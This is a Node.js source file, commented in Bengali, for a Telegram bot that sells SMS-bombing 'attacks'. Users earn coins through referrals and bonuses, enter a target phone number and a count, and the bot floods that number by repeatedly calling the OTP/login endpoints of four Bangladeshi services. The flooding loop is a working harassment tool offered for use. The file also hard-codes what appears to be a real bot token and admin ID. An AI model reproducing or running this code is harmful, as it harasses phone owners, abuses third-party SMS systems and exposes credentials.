const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');
const http = require('http');

// --- কনফিগারেশন ---
const token = '8784762504:AAH4uP_glf7oKo52fiUiInsxOYheI0Mm-U8';
const adminId = '7225943533'; 
const channelId = '@srmtelecom'; // আপনার চ্যানেলের ইউজারনেম
const channelLink = 'https://t.me/srmtelecom';
const bot = new TelegramBot(token, {polling: true});

// ডাটাবেস ফাইল লোড
const dbFile = 'users.json';
let users = {};
if (fs.existsSync(dbFile)) { 
    try { users = JSON.parse(fs.readFileSync(dbFile)); } catch (e) { users = {}; }
}
function saveDB() { fs.writeFileSync(dbFile, JSON.stringify(users, null, 2)); }

// Render সার্ভার সচল রাখতে
const PORT = process.env.PORT || 3000;
http.createServer((req, res) => { res.write("S.R.M Ultimate System is Online!"); res.end(); }).listen(PORT);

console.log("🚀 S.R.M TELECOM (All Features Active) চালু হয়েছে...");

// প্রধান মেনু বাটন
const mainMenu = {
    reply_markup: {
        keyboard: [
            [{ text: '🚀 শুরু করুন (Attack)' }, { text: '💰 প্রোফাইল ও কয়েন' }],
            [{ text: '🎁 ডেইলি বোনাস' }, { text: '🔗 রেফার করুন' }],
            [{ text: '📢 চ্যানেল' }]
        ],
        resize_keyboard: true
    }
};

// চ্যানেল সাবস্ক্রিপশন চেক
async function isSubscribed(chatId) {
    try {
        const res = await bot.getChatMember(channelId, chatId);
        return ['member', 'administrator', 'creator'].includes(res.status);
    } catch (e) { return false; }
}

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    const userId = msg.from.id.toString();
    if (!text) return;

    // ১. ইউজার রেজিস্টার (Initial Balance 0)
    if (!users[userId]) {
        users[userId] = { balance: 0, lastBonus: 0, step: '', name: msg.from.first_name || "User" };
        
        // রেফারাল চেক
        if (text.startsWith('/start ') && text.split(' ')[1] !== userId) {
            const refId = text.split(' ')[1];
            if (users[refId]) {
                users[refId].balance += 1;
                bot.sendMessage(refId, `🎊 অভিনন্দন! আপনার রেফারে একজন জয়েন করায় আপনি **১ কয়েন** পেয়েছেন।`);
            }
        }
        saveDB();
    }

    // ২. ফোর্স জয়েন চেক
    const joined = await isSubscribed(chatId);
    if (!joined && text !== '/start' && !text.startsWith('/start')) {
        return bot.sendMessage(chatId, `❌ **অ্যাক্সেস লক!**\n\nবটটি ব্যবহার করতে আমাদের চ্যানেলে জয়েন থাকা বাধ্যতামূলক।\n\n📢 লিংক: ${channelLink}\n\nজয়েন করে আবার /start দিন।`, { parse_mode: "Markdown" });
    }

    // ৩. অ্যাডমিন প্যানেল (কয়েন গিফট, ইউজার লিস্ট, ব্রডকাস্ট)
    if (userId === adminId) {
        if (text.startsWith('add ')) {
            const [_, targetId, amount] = text.split(' ');
            if (users[targetId]) {
                users[targetId].balance += parseInt(amount);
                saveDB();
                bot.sendMessage(chatId, `✅ ইউজার ${targetId}-কে ${amount} কয়েন দেওয়া হয়েছে।`);
                bot.sendMessage(targetId, `🎊 অ্যাডমিন আপনাকে **${amount} কয়েন** গিফট করেছেন!`);
            } else { bot.sendMessage(chatId, "❌ ইউজার আইডি পাওয়া যায়নি।"); }
            return;
        }
        if (text === '/users') {
            return bot.sendMessage(chatId, `📊 মোট ইউজার: ${Object.keys(users).length}`);
        }
        if (text.startsWith('broadcast ')) {
            const bMsg = text.replace('broadcast ', '');
            Object.keys(users).forEach(id => bot.sendMessage(id, `📢 **S.R.M নোটিশ:**\n\n${bMsg}`).catch(()=>{}));
            return bot.sendMessage(chatId, "✅ ব্রডকাস্টিং সম্পন্ন।");
        }
    }

    // ৪. মেনু ফাংশনস
    if (text === '/start' || text.startsWith('/start')) {
        let msgStart = "🔥 **S.R.M TELECOM**\nপ্রতিটি অ্যাটাকে ১ কয়েন কাটবে। বোনাস ও রেফার করে কয়েন আয় করুন।";
        if (userId === adminId) msgStart += "\n\n👑 **অ্যাডমিন মোড সচল।**";
        return bot.sendMessage(chatId, msgStart, mainMenu);
    }

    if (text === '💰 প্রোফাইল ও কয়েন') {
        const bal = (userId === adminId) ? "Unlimited ♾" : users[userId].balance;
        return bot.sendMessage(chatId, `👤 নাম: ${users[userId].name}\n🆔 আইডি: \`${userId}\`\n💰 ব্যালেন্স: ${bal}`, { parse_mode: "Markdown" });
    }

    if (text === '🎁 ডেইলি বোনাস') {
        const now = Date.now();
        if (now - users[userId].lastBonus < 86400000) return bot.sendMessage(chatId, "⏳ ২৪ ঘণ্টা পর আবার ট্রাই করুন।");
        users[userId].balance += 2;
        users[userId].lastBonus = now;
        saveDB();
        return bot.sendMessage(chatId, "✅ অভিনন্দন! আপনি **২ কয়েন** ডেইলি বোনাস পেয়েছেন।");
    }

    if (text === '🔗 রেফার করুন') {
        const refLink = `https://t.me/srmtelecombot?start=${userId}`; // আপনার বটের ইউজারনেম ঠিক করুন
        return bot.sendMessage(chatId, `🔗 **আপনার রেফার লিঙ্ক:**\n${refLink}\n\nপ্রতি রেফারে পাবেন **১ কয়েন**!`);
    }

    if (text === '📢 চ্যানেল') {
        return bot.sendMessage(chatId, `আমাদের অফিশিয়াল চ্যানেল: ${channelLink}`);
    }

    // ৫. অ্যাটাক প্রসেস (All Power APIs)
    if (text === '🚀 শুরু করুন (Attack)') {
        if (userId !== adminId && users[userId].balance < 1) return bot.sendMessage(chatId, "❌ আপনার কয়েন শেষ! বোনাস নিন।");
        users[userId].step = 'num';
        saveDB();
        return bot.sendMessage(chatId, "📱 টার্গেট নম্বরটি দিন (১১ ডিজিট):", { reply_markup: { remove_keyboard: true } });
    }

    if (users[userId]?.step === 'num' && text.length === 11) {
        users[userId].target = text;
        users[userId].step = 'amount';
        saveDB();
        return bot.sendMessage(chatId, "🔢 কয়টি SMS পাঠাতে চান? (১-৩০):");
    }

    if (users[userId]?.step === 'amount') {
        const amount = parseInt(text);
        if (isNaN(amount) || amount > 30) return bot.sendMessage(chatId, "⚠️ সর্বোচ্চ ৩০টি দিন।");
        const target = users[userId].target;
        
        if (userId !== adminId) users[userId].balance -= 1;
        users[userId].step = '';
        saveDB();

        bot.sendMessage(chatId, `🚀 **${target}** নম্বরে অল-ইন-ওয়ান অ্যাটাক শুরু...`, mainMenu);

        let success = 0;
        for (let i = 0; i < amount; i++) {
            // ১. Robi API (POST)
            try { await axios.post('https://www.robi.com.bd/api/v1/user/otp-login/request', { mobile: target }, { timeout: 3000 }); success++; } catch (e) {}

            // ২. BdTickets API (POST - Port 20100)
            try { await axios.post('https://api.bdtickets.com:20100/v1/auth', { createUserCheck: true, phoneNumber: "+88" + target, applicationChannel: "WEB_APP" }, { timeout: 3000 }); success++; } catch (e) {}

            // ৩. Banglalink API (POST)
            try { await axios.post('https://web-api.banglalink.net/api/v1/user/otp-login/request', { mobile: target }, { timeout: 3000 }); success++; } catch (e) {}

            // ৪. Iqra Live (GET)
            try { await axios.get(`https://apibeta.iqra-live.com/api/v2/sent-otp/${target}`, { timeout: 3000 }); success++; } catch (e) {}

            await new Promise(r => setTimeout(r, 4500)); // ৫ সেকেন্ড গ্যাপ
        }
        bot.sendMessage(chatId, `✅ **মিশন সম্পন্ন!**\n🎯 টার্গেট: ${target}\n📤 মোট হিট: ${success}টি`, mainMenu);
    }
});
